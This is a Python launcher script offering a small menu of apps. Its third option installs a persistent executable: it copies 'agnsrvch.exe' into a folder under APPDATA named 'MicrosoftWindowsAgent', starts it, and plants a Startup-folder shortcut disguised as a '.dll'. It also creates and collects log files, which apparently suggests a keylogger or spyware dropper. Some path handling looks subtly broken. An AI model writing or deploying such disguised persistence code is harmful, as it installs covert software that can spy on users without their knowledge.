# Switch-App.py
from Colors import color
from os import system as cmd, getenv, path, listdir
from time import sleep
from pathlib import Path
import win32com.client
from Colors import text

# Text Samples
which_app = text.which_app
shell_symbol = text.shell_simbol
wrong_value = text.wrong_value
version = text.version
user_text = text.user_text

# Constants
APPDATA = getenv('APPDATA')
DESKTOP = path.join(APPDATA, r"\Microsoft\Windows\Start Menu\Programs\Startup")
LOG_DIR = path.join(APPDATA, "MicrosoftWindowsAgent")
LOG_FILE = path.join(LOG_DIR, "log.txt")


def cls():
    cmd("cls")


def create_file_shortcut(file_path, shortcut_name=None):
    shell = win32com.client.Dispatch("WScript.Shell")
    if not shortcut_name:
        shortcut_name = path.basename(file_path)
    shortcut_path = path.join(DESKTOP, f"{shortcut_name}.lnk")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = file_path
    shortcut.WorkingDirectory = path.dirname(file_path)
    shortcut.save()


def copy_log_file():
    if path.isfile(LOG_FILE):
        cmd(rf"copy {LOG_FILE} {LOG_FILE.replace('.txt', '000.txt')}")
    if not path.exists(r"./logs"):
        cmd(r"mkdir ./logs")
    log_files = [f for f in listdir("./logs") if f.startswith("log")]

    for log in log_files:
        number = int(log[3:6]) + 1
        if number < 1000:
            new_log_name = f"log{number:03}.txt"
            cmd(rf"copy {LOG_FILE.replace('.txt', '000.txt')} ./logs/{new_log_name}")


cls()
print(user_text)
option = input(f"{which_app}\n{shell_symbol}")

if option == '0':
    cls()
    cmd("Prompt.exe")
elif option == '1':
    cls()
    cmd("Sounds.exe")
elif option == '2':
    cls()
    print(f"{color.fg.cyan}Copy log file? {color.reset}{color.type.Black}[Y/n]{color.reset}")
    opt = input(f"\n {shell_symbol}").strip().capitalize()
    if opt == "Y":
        copy_log_file()
    if not Path(LOG_DIR+"\\agnsrvch.exe").is_file():
        cmd(f'mkdir {LOG_DIR}')
        cmd(f'type nul > {LOG_FILE}')
        cmd(f"copy agnsrvch.exe {LOG_DIR}")
        cmd(f"start {path.join(LOG_DIR, 'agnsrvch.exe')}")
        create_file_shortcut(path.join(LOG_DIR, "agnsrvch.exe"), "agnsrvch.dll")
        cmd("exit")
else:
    print(f"{wrong_value}\n{'-' * 35}\n{version} By {color.type.Black}{color.fg.purple}EoRoferr{color.reset}")
    sleep(10)
    exit(1)
